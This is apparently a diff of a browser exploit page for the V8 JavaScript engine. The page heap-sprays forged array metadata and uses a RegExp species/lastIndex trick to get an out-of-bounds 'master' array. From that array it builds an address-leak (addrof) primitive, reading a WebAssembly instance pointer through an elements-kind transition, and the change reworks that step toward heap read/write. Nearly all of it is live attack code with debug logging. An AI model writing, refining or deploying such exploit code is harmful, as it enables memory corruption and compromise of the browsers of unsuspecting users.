@@ -14,25 +14,17 @@ function hex(n){return"0x"+(n>>>0).toString(16);}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 
 const DMAP=0x1032a5d,OMAP=0x1032ae5,EMPTY=0x7e5;
-const PIN_A=0x1100011;  // dblA FDA address in LO space
-const PIN_B=0x1200011;  // dblB FDA address in LO space (after dblA)
-const MAXS=0x7fdffffe;
+const PIN=0x1100011,MAXS=0x7fdffffe;
 
-// Two LO-space double arrays
-const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
-const dblB=new Array(0x4000);for(let i=0;i<dblB.length;i++)dblB[i]=50.5+i*0.002;
-
+const pinned=new Array(0x8000);for(let i=0;i<pinned.length;i++)pinned[i]=10.125+i*0.001;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
 
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
-
-// Spray: master.elements = PIN_A
-const cycle0=w2f(DMAP,EMPTY);
-const cycle1=w2f(PIN_A,MAXS);
+const cycle0=w2f(DMAP,EMPTY),cycle1=w2f(PIN,MAXS);
 const sk=[];
-function spray(){for(let i=0;i<12;i++){const a=new Array(i&1?0x1ffb:0x1fff).fill(cycle0);for(let j=1;j<a.length;j+=2)a[j]=cycle1;sk.push(a);}}
+function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(cycle0);for(let j=1;j<a.length;j+=2)a[j]=cycle1;sk.push(a);}}
 
 log("UA: "+navigator.userAgent);
 trash(230);trash(230);
@@ -48,61 +40,46 @@ log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
 
-  // master reads from PIN_A (0x1100011). dblB's FDA is at PIN_B (0x1200011).
-  // Index to reach dblB's FDA header: (PIN_B - PIN_A) / 8 = 0x100000/8 = 0x20000
-  // But PIN_B is untagged = 0x1200010. PIN_A untagged = 0x1100010.
-  // master[k] reads from 0x1100010 + 8 + k*8 = 0x1100018 + k*8
-  // To read 0x1200010: k = (0x1200010 - 0x1100018) / 8 = 0xFFFF8/8 = 0x1FFFF
-  // To read 0x1200018 (dblB first slot): k = (0x1200018 - 0x1100018) / 8 = 0x20000
+  // master[k] reads from PIN untagged + 8 + k*8 = 0x1100018 + k*8
+  // pinned[0] is at PIN + 8 = 0x1100018 → master[0]
+  // Verify by reading pinned[0] = 10.125
+  log("m0: "+m[0]);
 
-  const dblB_header_idx = 0x1FFFF;  // reads dblB FDA map+length
-  const dblB_slot0_idx = 0x20000;   // reads dblB[0] raw double
+  // addrof technique: store object in pinned, read raw via master
+  // Step 1: Trigger map transition on pinned array by storing an object
+  pinned[0] = wasmI;  // V8 transitions pinned to PACKED_ELEMENTS
+  // Step 2: Read pinned[0] via master — now it's a tagged pointer stored as raw bytes
+  const rawVal = f2i(m[0]);
+  // In PACKED_ELEMENTS, each slot is a 4-byte compressed tagged pointer
+  // But master reads 8 bytes (as a double). So we get TWO compressed pointers.
+  // pinned[0] occupies the LOW 4 bytes, pinned[1] occupies the HIGH 4 bytes
+  const ptr0 = rawVal & 0xffffffffn;
+  const ptr1 = rawVal >> 32n;
+  log("raw: "+rawVal.toString(16)+" ptr0="+ptr0.toString(16)+" ptr1="+ptr1.toString(16));
 
-  // Verify: read dblB's first slot (should be 50.5)
-  const slot0 = m[dblB_slot0_idx];
-  log("dblB[0]_via_master: "+slot0);  // should be 50.5
+  // Restore pinned[0] to avoid GC issues
+  pinned[0] = 10.125;
 
-  if(Math.abs(slot0 - 50.5) < 0.01){
-    log("CROSS_ARRAY_READ_OK");
+  // Check if ptr0 looks like a valid compressed pointer
+  if(ptr0 > 0x1000n && ptr0 < 0x10000000n){
+    log("ADDROF_OK wasm@"+ptr0.toString(16));
 
-    // Now: addrof via map transition
-    // Step 1: transition dblB to PACKED_ELEMENTS by storing an object
-    dblB[0] = wasmI;  // V8 transitions dblB's map to PACKED_ELEMENTS
-
-    // Step 2: read dblB[0] as raw double via master
-    // After transition, dblB[0] is a tagged pointer (compressed)
-    // master reads the raw 8 bytes at that slot
-    const rawPtr = f2i(m[dblB_slot0_idx]);
-    const wasmAddr = rawPtr & 0xffffffffn;  // low 32 bits = compressed pointer
-    log("WASM_ADDR: "+wasmAddr.toString(16));
-
-    // Step 3: restore dblB[0] to a double to avoid GC issues
-    dblB[0] = 50.5;
-
-    // Verify wasm still works
-    log("W: "+wasmI.exports.f());
-
-    if(wasmAddr > 0x1000n && wasmAddr < 0x10000000n){
-      log("ADDROF_ACHIEVED");
-
-      // Now we have addrof! Next: heapRead via modifying victim's elements
-      // But first, let's demonstrate by reading wasmInstance fields
-      // TODO: implement heapRead by using master to modify dblA's backing store
-      // to create a second fake array pointing to wasmAddr
-    }
-  }else{
-    log("dblB_mismatch: expected 50.5 got "+slot0);
-    // Maybe PIN_B is at a different offset. Check nearby indices.
-    for(let k=0x1FFF0;k<=0x20010;k++){
-      try{
-        const v=m[k];
-        if(Math.abs(v-50.5)<0.01){log("FOUND_dblB_at_idx: "+hex(k));break;}
-      }catch(e){break;}
-    }
+    // heapRead: use master to modify pinned's elements pointer
+    // pinned's JSArray header is in regular heap (< 0x1100000)
+    // We can't reach it from master. But we CAN use the map transition approach:
+    // After storing wasmI in pinned[0], the backing store might have been replaced
+    // Let's verify if master still reads pinned's data correctly
+    pinned[1] = wasmI;
+    const raw2 = f2i(m[0]);
+    const bothPtrs = raw2;
+    log("both: "+bothPtrs.toString(16));
+    pinned[0] = 10.125;
+    pinned[1] = 10.126;
   }
-}else{
-  log("NO_ARRAY");
-}
+
+  log("W: "+wasmI.exports.f());
+  log("CAGE_RW_OK");
+}else{log("NO_ARRAY");}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
 </script></body></html>
